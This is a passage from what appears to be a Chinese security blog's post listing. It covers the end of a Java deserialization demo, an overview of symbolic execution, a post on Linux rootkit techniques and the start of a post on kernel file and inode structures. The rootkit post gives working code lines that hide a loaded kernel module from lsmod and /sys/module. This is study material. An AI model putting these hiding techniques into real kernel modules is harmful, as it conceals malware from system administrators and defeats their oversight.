System.out.println(<span class="string">&quot;-before newInstance-&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (data != <span class="keyword">null</span>)</span><br><span class="line">            instance = ctor.newInstance(data);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            instance = ctor.newInstance();</span><br><span class="line">        System.out.println(<span class="string">&quot;-after newInstance-&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream byteOut = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(byteOut);</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;byteOut.toByteArray().length:&quot;</span>+byteOut.toByteArray().length);</span><br><span class="line">        ByteArrayInputStream byteIn = <span class="keyword">new</span> ByteArrayInputStream(byteOut.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(byteIn);</span><br><span class="line">        <span class="comment">// 可以触发自定义类的readObject方法</span></span><br><span class="line">        Object object = (Object)ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;object:&quot;</span> + object.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序执行结果如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-before newInstance-</span><br><span class="line">MyObject(String name) tttest</span><br><span class="line">-after newInstance-</span><br><span class="line">byteOut.toByteArray().length:71</span><br><span class="line">MyObject-readObject!!!! tttest</span><br><span class="line">object:class test.MyObject</span><br><span class="line">-before newInstance-</span><br><span class="line">MyObject(String name) no name-default</span><br><span class="line">-after newInstance-</span><br><span class="line">byteOut.toByteArray().length:80</span><br><span class="line">MyObject-readObject!!!! no name-default</span><br><span class="line">object:class test.MyObject</span><br></pre></td></tr></table></figure>
<p>基础知识就介绍到这里，后面会再进行漏洞分析的学习。<br><strong>reference</strong><br>JAVA反序列化漏洞完整过程分析与调试</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/03/20/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/20/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">符号执行基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-03-20 20:11:14" itemprop="dateCreated datePublished" datetime="2017-03-20T20:11:14+08:00">2017-03-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这篇文章主要是参考中科大一位同学的文章，介绍了符号执行的基本原理，以及其中的路径状态空间爆炸、复杂结构语义和操作语义建模及程序全局分析这三个关键技术的难点。</p>
<h2 id="符号执行的基本原理"><a href="#符号执行的基本原理" class="headerlink" title="符号执行的基本原理"></a>符号执行的基本原理</h2><p>1.基本原理<br>符号执行是指在不执行程序的前提下，用符号值表示程序变量的值，然后模拟程序执行来进行相关分析的技术，它可以分析代码的所有语义信息，也可以只分析部分语义信息（如只分析”内存是否释放”这一部分的语义信息）。<br>符号执行分为<code>过程内分析</code>和<code>过程间分析</code>（又称<code>全局分析</code>）。过程内分析是指只对单个过程的代码进行分析，全局分析指对整个软件代码进行上下文敏感的分析。所谓上下文敏感分析是指在当前函数入口点要考虑当前的函数间调用信息和环境信息等。程序的全局分析是在过程内分析的基础上进行的，如果过程内分析中包含了函数调用，就引入了过程间分析，因此两者之间是相对独立又相互依赖的关系。<br>（1）过程内分析流程如下图所示：<br><img src="/images/symexe/guocheng.png" alt="过程内分析"><br>首先，对待分析的单个过程代码对象构建<code>控制流图（Control Flow Graph，CFG）</code>。控制流图（CFG）是编译器内部用有向图表示一个程序过程的一种抽象数据结构，图中的节点表示一个程序基本块，基本块是没有任何跳转的顺序语句代码块，图中的边表示代码中的跳转，它是有向边，起点和终点都是基本块。在CFG上从入口节点开始模拟执行，在遇到分支节点时，使用<code>约束求解器</code>判定哪条分支可行，并根据预先设计的<code>路径调度策略</code>实现对该过程所有路径的遍历分析，最后输出每条可执行路径的分析结果。其中约束求解是数学上的判定过程，形象地说是对一系列的约束方程进行求解。<br>如果要进行源代码的安全性检测，则需要在过程内分析时，根据具体的<code>安全知识库</code>来添加安全约束。例如，如果要添加缓冲区溢出的安全约束，则在执行时遇到对内存进行操作的语句时，就要对该语句所操作的内存对象的边界添加安全约束。以上面的方式来进行安全约束的添加，并且每次在添加之后就使用约束求解器对所有的安全约束进行求解，以判定当前是否可能潜在一个安全问题。<br>（2）程序全局分析流程如下图所示：<br><img src="/images/symexe/quanju.png" alt="程序全局分析"><br>首先，为整个程序代码构建<code>函数调用图（Call Graph，CG）</code>，在函数调用图中，节点表示函数，边表示函数间的调用关系。根据预设的<code>全局分析调度策略</code>，对CG中的每个节点（对应一个函数）进行过程内分析，最终给出CG每种可行的调用序列的分析结果。<br>符号执行在发展过程中出现了一种叫做动态符号执行的方法（concrete and symbolic， <code>concolic</code>）。动态符号执行是以具体数值作为输入来模拟执行程序代码，与传统静态符号执行相比，其输入值的表示形式不同。动态符号执行使用<code>具体值</code>作为输入，同时启动<code>代码模拟执行器</code>，并从当前路径的分支语句的谓词中搜集所有符号约束。然后修改该符号约束内容构造出一条新的可行的路径约束，并用约束求解器求解出一个可行的新的具体输入，接着符号执行引擎对新输入值进行一轮新的分析。通过使用这种输入迭代产生变种输入的方法，理论上所有可行的路径都可以被计算并分析一遍。<br>动态符号执行相对于静态符号执行的优点是每次都是具体输入的执行，在模拟执行这个过程中，符号化的模拟执行比具体化的模拟执行的开销大很多；并且模拟执行过程中所有的变量都为具体值，而不必使用复杂的数据结构来表达符号值，使得模拟执行的花销进一步减少。但是动态符号执行的结果是对程序的所有路径的一个<code>下逼近</code>，即其最后产生路径的集合应该比所有路径集合小，但这种情况在软件测试中是允许的。<br>2.符号执行示例<br>下面通过一个示例来具体说明符号执行的分析原理。如下图所示：<br><img src="/images/symexe/yuanli.png"><br>先对一段简单的代码函数test构建控制流图CFG，可以看出该CFG只包含了2条路径。接着，以符号值为输入，模拟执行代码，在遇到分支语句时，使用约束求解器判定这两条路径的可行性，本示例使用的是”深度优先”的路径调度策略。在对两条路径模拟执行并收集路径约束后，使用约束求解器可以求解出分别触发这两条路径的两个测试例输入及对应的返回值。测试例输入为”i = 11”时，返回值”10”；测试例输入为”i = 10”时，返回值为”9”。<br>通过这个简单的例子可以看出使用符号执行的方法进行分析可以达到很高的路径覆盖率，并且结合约束求解器还可以实现测试例的自动生成。但是这仅仅是符号执行技术和约束求解结合的具体应用的一个方面，符号执行技术还可以有其他的应用。</p>
<h2 id="符号执行的关键技术"><a href="#符号执行的关键技术" class="headerlink" title="符号执行的关键技术"></a>符号执行的关键技术</h2><p>（1）路径状态空间爆炸<br>符号执行技术在理论上面临着路径状态空间的爆炸问题，其主要形成原因是每一个分支条件语句都可能会使当前的路径再分支出一条新的路径，而这是”指数级”增长的。相对于静态符号执行在分支语句时都是符号值的约束，动态符号执行在分支语句时则都是具体值的约束。动态符号执行的当前路径执行过程中不会产生新路径，只在执行结束后在去产生新路径，且一次只产生一条。但是它们都没法从根本上避免路径状态空间爆炸所造成的影响。一方面，在具体的实现中有使用限定每个过程内的分析路径数目上限的方法来缓解该问题所产生的影响，如Coverity，也可以使用设置时间上限或者内存空间上限的方法来缓解路径爆炸问题所造成分析工具崩溃的情况，如Fortify。另一方面，设计出更好的路径遍历策略，可以在有限的时间和空间范围内达到最大的代码检测覆盖率。改进路径调度算法能提高符号执行的分析性能，但这都只是局部改进，很难从根本上解决这一问题。<br>（2）复杂结构语义和操作语义的建模<br>符号执行实现时需要对被分析代码的结构语义进行建模，然后再对被分析代码的操作语义进行建模，最后构建一个虚拟机模型。由于符号执行是路径敏感的分析方法，因此一般为每条路径都会创建一个专属的虚拟机模型，以保证路径之间的相互独立性。该模型的准确程度将直接影响静态分析结果的精度。由于编程语言中使用的复杂数据结构和复杂操作语句具有较高的灵活性，使得它们的建模变得十分困难。<br>有一种”惰性初始化”的方法，其思想是为每个数据结构（特别是复杂数据结构）建模时，在声明或者定义时只为其构建类型信息，直到被使用的时候，才根据使用的需要来初始化该变量的对象信息。还有一些其他复杂对象建模方法的解决方案。<br>（3）程序全局分析<br>在程序全局分析过程中，当对一个规模较大、包含很多的过程间调用的程序进行上下文敏感的分析时，每当一个过程调用了另一个过程时都进入子过程进行分析，虽然会很精确，但这种方式可能会造成大量的时间空间开销，而使分析过程异常终止或在用户可接受的时间内无法完成。<br>一种比较好的全局分析方法叫做”函数摘要”。函数摘要的方法是在过程内分析的基础上对已分析过的函数进行一个摘要记录的操作。在以后的分析中遇到调用其他函数时，如果存在被调用函数的摘要，则直接调用该函数的摘要并对该摘要行为进行解释；如果不存在被调用函数的摘要信息，则进入被调用函数进行分析，并在分析之后进行摘要保存。函数摘要是一种相对折中的办法，所创建的函数摘要也可能很不准确。另一个问题是对无法获得源代码的第三方库函数的摘要只能通过人工的编写来完成，这也可能是不精确的，而这两点都会影响到最终分析结果的精度。<br>对于函数摘要的构建策略也是一个研究内容，有<a target="_blank" rel="noopener" href="http://www1.cs.columbia.edu/~junfeng/10fa-e6998/papers/exe.pdf">文章</a>用函数调用图上的自顶向下的需求驱动的策略来为所有子过程创建函数摘要。由于循环语句可能会使被摘要函数的路径空间爆炸，而使得无法对函数的所有路径都进行分析摘要，该文章介绍了结合使用循环不变量来进行函数摘要以解决循环语句引入的问题。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>符号执行技术可以用于测试例的自动生成，也可以用于源代码安全性的检测。这两项工作的成效都十分依赖于约束求解器的性能，同时还受硬件设备处理能力的影响。符号执行技术在实际应用中的效果还是主要取决于前面提到的三个关键技术。随着符号执行理论及约束求解理论的发展，该技术的实用价值性也会越来越高，将会在静态分析领域逐渐占据主导地位。<br><strong>reference</strong><br>《符号执行技术研究》</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/03/16/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%BA%8C%EF%BC%89%E9%9A%90%E8%97%8FLKM/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/16/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%BA%8C%EF%BC%89%E9%9A%90%E8%97%8FLKM/" class="post-title-link" itemprop="url">Rootkit技术（二）隐藏LKM</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-03-16 21:54:31" itemprop="dateCreated datePublished" datetime="2017-03-16T21:54:31+08:00">2017-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a href="">前一篇文章</a>中介绍了hook系统调用的方法，但是通过<code>lsmod</code>等方法可以看到正在内核运行的模块。所以本文主要介绍隐藏LKM的方法，其实很简单。</p>
<h2 id="从lsmod命令中隐藏模块"><a href="#从lsmod命令中隐藏模块" class="headerlink" title="从lsmod命令中隐藏模块"></a>从lsmod命令中隐藏模块</h2><p>对于rootkit来说，隐蔽性非常重要，但lsmod命令就能直接看到我们编写的模块。这里先介绍一下lsmod原理，以便理解如何在lsmod命令中隐藏模块。<br>lsmod命令是通过<code>/proc/modules</code>来获取当前系统模块信息的。而/proc/modules中的当前系统模块信息是内核利用<code>struct module</code>结构体的表头遍历内核模块链表、从所有模块的<code>struct module</code>结构体中获取模块的相关信息来得到的。结构体<code>struct module</code>在内核中代表一个内核模块。通过insmod把模块插入内核时，模块便与一个<code>struct module</code>结构体相关联，并成为内核的一部分，所有的内核模块都被维护在一个全局链表中，链表头是一个全局变量<code>struct module *modules</code>。任何一个新创建的模块，都会被加入到这个链表的头部，通过<code>modules-&gt;next</code>即可引用到。为了让模块在lsmod命令的输出中消失，就需要在这个链表内删除这个模块。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_del_init(&amp;__this_module.<span class="built_in">list</span>);</span><br></pre></td></tr></table></figure>
<p>list_del_init函数定义于include/linux/list.h中：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_init</span> <span class="params">(struct list_head * entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     __list_del (entry-&gt;prev, entry-&gt;next);</span><br><span class="line">     INIT_LIST_HEAD (entry);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del (struct list_head * prev, struct list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">     next-&gt; prev = prev;</span><br><span class="line">     prev-&gt; next = next;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">INIT_LIST_HEAD</span> <span class="params">(struct list_head * <span class="built_in">list</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">list</span>-&gt; next = <span class="built_in">list</span>;</span><br><span class="line">     <span class="built_in">list</span>-&gt; prev = <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只要在模块的初始化函数中加入  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_del_init(&amp;__this_module.<span class="built_in">list</span>);</span><br></pre></td></tr></table></figure>
<p>就可以在lsmod命令中隐藏我们的模块了！</p>
<h2 id="从sysfs中隐藏模块"><a href="#从sysfs中隐藏模块" class="headerlink" title="从sysfs中隐藏模块"></a>从sysfs中隐藏模块</h2><p>除了lsmod命令和相对应的查看/proc/modules以外，还可以在sysfs中，也就是查看/sys/module/目录发现内核中的模块。<br>这个问题也很好解决，也是在初始化函数中添加一行代码：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);</span><br></pre></td></tr></table></figure>
<p><code>THIS_MODULE</code>在include/linux/module.h中的定义如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THIS_MODULE (&amp;__this_module)</span></span><br></pre></td></tr></table></figure>
<p>可以看出THIS_MODULE的作用是指向当前模块。<code>&amp;THIS_MODULE-&gt;mkobj.kobj</code>则代表的是struct module结构体的成员struct module_kobject的一部分，结构体的定义如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_kobject</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">mod</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中kobj是一个struct kobject结构体，而kobject是组成设备模型的基本结构。这里简单介绍下sysfs这个概念，sysfs是一种基于RAM的文件系统，它提供了一种用于向用户空间展现内核空间里的对象、属性和链接的方法。sysfs与kobject层次紧密相连，它将kobject层次关系表现出来，使得用户空间可以看见这些层次关系。通常，sysfs是挂载在/sys目录下的，而/sys/module是一个sysfs的一个目录层次, 包含当前加载模块的信息. 我们通过kobject_del()函数删除我们当前模块的kobject就可以起到在/sys/module中隐藏lkm的作用。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/54263.html">http://www.freebuf.com/articles/system/54263.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/03/05/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%B8%89%EF%BC%89%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/03/05/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%B8%89%EF%BC%89%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" class="post-title-link" itemprop="url">Linux设备驱动（三）文件系统</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-03-05 23:07:27" itemprop="dateCreated datePublished" datetime="2017-03-05T23:07:27+08:00">2017-03-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Linux文件系统与设备驱动"><a href="#Linux文件系统与设备驱动" class="headerlink" title="Linux文件系统与设备驱动"></a>Linux文件系统与设备驱动</h2><p>图中所示为Linux中虚拟文件系统（VFS）、磁盘/Flash文件系统及一般的设备文件与设备驱动程序之间的关系。<br><img src="/images/linuxkernel/fs.png"><br>应用程序和VFS之间的接口是<code>系统调用</code>，而VFS与文件系统以及设备文件之间的接口是<code>file_operations</code>结构体成员函数，这个结构体包含对文件进行打开、关闭、读写、控制的一系列成员函数。</p>
<h3 id="file结构体"><a href="#file结构体" class="headerlink" title="file结构体"></a>file结构体</h3><p>file结构体代表一个打开的文件，系统中每个打开的文件在内核空间都有一个关联的<code>struct file</code>。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。在内核和驱动源代码中，<code>struct file</code>的指针通常被命名为<code>file</code>或<code>filp</code>。<br><strong>代码清单</strong> include/linux/fs.h: file  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>   <span class="title">fu_llist</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">fu_rcuhead</span>;</span></span><br><span class="line">    &#125; f_u;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">path</span>     <span class="title">f_path</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> f_dentry    f_path.dentry</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span>        *<span class="title">f_inode</span>;</span>   <span class="comment">/* cached value */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>    *<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Protects f_ep_links, f_flags, f_pos vs i_size in lseek SEEK_CUR.</span></span><br><span class="line"><span class="comment">     * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>      f_lock;</span><br><span class="line">    <span class="keyword">atomic_long_t</span>       f_count;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        f_flags;</span><br><span class="line">    <span class="keyword">fmode_t</span>         f_mode;</span><br><span class="line">    <span class="keyword">loff_t</span>          f_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>  <span class="title">f_owner</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>   *<span class="title">f_cred</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>    <span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">    u64         f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>            *f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">    <span class="keyword">void</span>            *private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">    <span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">f_ep_links</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">f_mapping</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_WRITECOUNT</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> f_mnt_write_state;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="inode结构体"><a href="#inode结构体" class="headerlink" title="inode结构体"></a>inode结构体</h3><p>VFS inode包含文件访问权限、所有者、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。<br><strong>代码清单</strong> include/linux/fs.h: inode  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">umode_t</span>         i_mode; <span class="comment">// inode的权限</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>      i_opflags;</span><br><span class="line">    <span class="keyword">kuid_t</span>          i_uid; <span class="comment">// inode所有者的id</span></span><br><span class="line">    <span class="keyword">kgid_t</span>          i_gid; <span class="comment">// inode所属的群组id</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_flags;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">dev_t</span>           i_rdev; <span class="comment">// 若是设备文件，此字段将记录设备的设备号</span></span><br><span class="line">    <span class="keyword">loff_t</span>          i_size; <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span> <span class="comment">// inode最近一次的存取时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span> <span class="comment">// inode最近一次的修改时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span> <span class="comment">// inode的产生时间</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span>          i_bytes;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_blkbits;</span><br><span class="line">    <span class="keyword">blkcnt_t</span>        i_blocks; <span class="comment">// inode所使用的block数，一个block为512字节</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span> <span class="comment">// 若是块设备，为其对应的block_device结构体指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span> <span class="comment">// 若是字符设备，为其对应的cdev结构体指针</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>查看<code>/proc/devices</code>文件可以获知系统中注册的设备，第一列为主设备号，第二列为设备名：  </p>
